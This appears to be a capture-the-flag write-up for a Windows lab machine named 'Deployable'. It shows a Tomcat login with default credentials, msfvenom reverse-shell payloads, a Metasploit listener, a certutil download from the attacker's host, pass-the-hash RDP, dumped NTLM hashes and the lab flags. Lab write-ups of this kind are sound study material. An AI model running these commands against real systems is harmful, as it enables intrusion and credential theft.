# DEPLOYABLE

![](../.gitbook/assets/673ed4be25b546348805822c3432b0f0.png)

## NMAP SCAN

```text
PORT      STATE SERVICE            REASON          VERSION
135/tcp   open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn        syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       syn-ack ttl 127 Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server? syn-ack ttl 127
5985/tcp  open  http               syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8009/tcp  open  ajp13              syn-ack ttl 127 Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp  open  http               syn-ack ttl 127 Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
47001/tcp open  http               syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49156/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49163/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49164/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
```

## PORT 8080 ENUMERATION

![](../.gitbook/assets/96c7a10fc57d4805a60b1c92acdc8cfa.png)

* DEFAULT CREDENTIALS WORKED \(tomcat:s3cret\)

![](../.gitbook/assets/bb87fd6998f04a8ab07da7814e40761c.png)

### EXPLOIT

```text
msfvenom -p java/meterpreter/reverse_tcp LHOST=10.10.0.63 LPORT=5314 -f war -o shell.war
```

![](../.gitbook/assets/fc8f1d8ce1314b268d124056291d3053.png)

![](../.gitbook/assets/bc7dfc640f0a4707a6d2a8e30d62aec7.png)

![](../.gitbook/assets/eba3297774ce4c889c5b716ef286dedb.png)

## WINPEAS

![](../.gitbook/assets/a0b059640dc548e2a70dfcbae4487700.png)

![](../.gitbook/assets/d585b6f33f7c4f9c975325f637225646.png)

![](../.gitbook/assets/050d5eb84a32412fb56c5633679e1c6e.png)

![](../.gitbook/assets/7e640394f57a4ca4b0c8aacc2cca49ae.png)

## PRIV ESC

![](../.gitbook/assets/50a5ec625ab34939915da28bb2505e91.png)

```text
msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.10.0.63 LPORT=5314 -f exe -o Service.exe

Listener
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter_reverse_tcp; set LHOST 10.10.0.63; set LPORT 5314; run"
```

![](../.gitbook/assets/41a01ffcddd64b53aa28a1d0c6eed2cb.png)

```text
certutil -urlcache -f http://10.10.0.63:8000/Service.exe Service.exe

```

![](../.gitbook/assets/3c94e273a360433792d77af37b2ac7b8.png)

![](../.gitbook/assets/26456905ca914d648fd9a114a291f300%20%281%29.png)

![](../.gitbook/assets/50a5ec625ab34939915da28bb2505e91%20%281%29.png)

* My METERPRETER died so i repeat the process and immediately migrate to a more stable service \(svchost.exe\)

![](../.gitbook/assets/78a1516318374affaeb04a92c61bc3b4.png)

![](../.gitbook/assets/8ac61342d4f84464be34955132dcde60.png)

## AFTER GETTING THE CREDS \(NTLM\) WE CAN LOGIN RDP IF WE WANT

```text
xfreerdp /u:administrator /pth:0bb5408c47b5f48554e95414ce42a97c /cert:ignore /v:172.31.1.13
```

![](../.gitbook/assets/36d741281e3640a8bacb15501648b6fa.png)

![](../.gitbook/assets/938bd9cfa0e549c4b87b640452b13336.png)

## CREDS

```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0bb5408c47b5f48554e95414ce42a97c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
tomcat:1001:aad3b435b51404eeaad3b435b51404ee:43e4a10ae4179f461f8b069336b1dd07:::
```

## FLAGS

### USER

```text
5b7dbd2f4ce39bb536fe1da6c897a4fb
```

### ROOT

```text
11400db5d23b9738534002f27b86c030
```

![](../.gitbook/assets/f32977a349284be88d518e76148423c6.png)

